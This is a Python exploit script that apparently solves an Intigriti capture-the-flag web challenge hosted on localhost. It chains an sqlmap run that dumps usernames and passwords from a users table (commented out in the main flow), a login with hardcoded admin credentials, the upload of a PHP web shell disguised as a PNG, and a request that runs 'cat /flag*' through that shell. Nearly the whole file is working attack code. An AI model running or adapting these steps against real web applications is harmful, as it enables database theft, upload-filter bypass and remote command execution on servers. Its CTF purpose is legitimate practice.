import requests
import random
import subprocess
import re
from urllib.parse import urljoin

# URLs
register_url = "http://127.0.0.1/auth/fruitables_register.php"
login_url = "http://127.0.0.1/auth/fruitables_login.php"
upload_url = "http://127.0.0.1/controllers/admin_dashboard.php"
base_url = "http://127.0.0.1/uploads/"  # Base URL for uploads

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
}

# Register a user with a unique username
def register_user(base_username, password, first_name="John", last_name="Doe"):
    unique_username = base_username + str(random.randint(1000, 9999))
    payload = {
        "username": unique_username,
        "password": password,
        "first_name": first_name,
        "last_name": last_name
    }
    try:
        response = requests.post(register_url, data=payload, headers=headers, allow_redirects=False)
        if response.status_code == 302 and "Location" in response.headers:
            print(f"Registered user: {unique_username}")
            return unique_username
        else:
            print("Registration failed. Check if user already exists or parameters are incorrect.")
            return None
    except Exception as e:
        print(f"Error registering user: {e}")
        return None

# Run SQLMap using subprocess to capture and filter output for only extracted data
def run_sqlmap_extraction():
    sqlmap_command = [
        "sqlmap",
        "-u", login_url,
        "--data", "username=ctf_user&password=irrelevant",
        "--batch",
        "--dbms", "PostgreSQL",
        "--dump",
        "--start", "1",
        "--stop", "5",
        "-T", "users",
        "-C", "username,password",
        "--flush-session",
        "--no-logging",
        "-v", "0"
    ]
    
    try:
        # Run SQLMap command and capture output
        result = subprocess.run(sqlmap_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        # Print SQLMap's stdout directly
        print("[SQLMap Output]")
        print(result.stdout)
        
        # Print any error output from SQLMap
        if result.stderr:
            print("[SQLMap Error Output]", result.stderr)

    except Exception as e:
        print(f"Error running SQLMap: {e}")

# Login as admin
def login_admin():
    login_data = {
        "username": "tjfry_admin",
        "password": "futurama"
    }
    session = requests.Session()
    try:
        response = session.post(login_url, data=login_data, headers=headers)
        if "Dashboard" in response.text:
            print("Admin login successful!")
            return session
        else:
            print("Admin login failed.")
            return None
    except Exception as e:
        print(f"Error during admin login: {e}")
        return None

# Upload an image file and extract the filename from the server response
def upload_image(session):
    with open("test.png.php", "rb") as image_file:
        files = {
            "fileToUpload": ("test.png.php", image_file, "image/png")
        }
        data = {
            "submit": "Upload File"
        }
        try:
            response = session.post(upload_url, files=files, data=data, headers=headers)
            if "has been uploaded" in response.text:
                # Extract filename from server response using regex
                filename_match = re.search(r"The file (.*?) has been uploaded", response.text)
                if filename_match:
                    filename = filename_match.group(1)
                    print(f"Image uploaded successfully! Filename: {filename}")
                    return filename
                else:
                    print("Upload succeeded, but could not extract filename.")
                    return None
            else:
                print("Image upload failed. Response:", response.text)
                return None
        except Exception as e:
            print(f"Error uploading image: {e}")
            return None

# Visit the uploaded image file URL
def command_injection(filename):
    if filename:
        image_url = urljoin(base_url, filename)
        print(f"Visiting uploaded image at: {image_url}")
        try:
            response = requests.get(image_url + '?cmd=cat+/flag*', headers=headers)
            if response.status_code == 200:
                print("Image accessed successfully!\n")
                flag_match = re.search(r"INTIGRITI\{.*?\}", response.text)
                if flag_match:
                    flag = flag_match.group(0)
                    print(f"Extracted flag: {flag}")
                else:
                    print("Flag not found in the image content.")
            else:
                print(f"Failed to access image. Status code: {response.status_code}")
        except Exception as e:
            print(f"Error accessing uploaded image: {e}")

# Main flow
if __name__ == "__main__":
    # base_username = "ctf_user"
    # password = "password123"

    # # Step 1: Register the user
    # registered_username = register_user(base_username, password)

    # # Step 2: Run SQLMap to extract username and password from the users table if registration was successful
    # if registered_username:
    #     print("\nRunning SQLMap to extract data from the users table...")
    #     run_sqlmap_extraction()

    # Step 3: Log in as the admin user
    session = login_admin()
    if session:
        # Step 4: Upload an image if login was successful
        filename = upload_image(session)
        # Step 5: Visit the uploaded image if upload was successful
        if filename:
            command_injection(filename)
